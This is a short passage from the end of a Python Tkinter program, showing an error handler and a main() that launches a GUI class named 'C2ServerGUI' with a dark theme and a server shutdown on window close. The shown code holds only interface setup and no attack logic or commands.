            messagebox.showerror("Error", f"Failed to open directory browser:\n{e}")


def main():
    root = tk.Tk()
    
    try:
        sv_ttk.set_theme("dark")
    except:
        pass
    
    app = C2ServerGUI(root)
    
    def on_closing():
        app.stop_server()
        root.destroy()
    
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()


if __name__ == "__main__":
    main()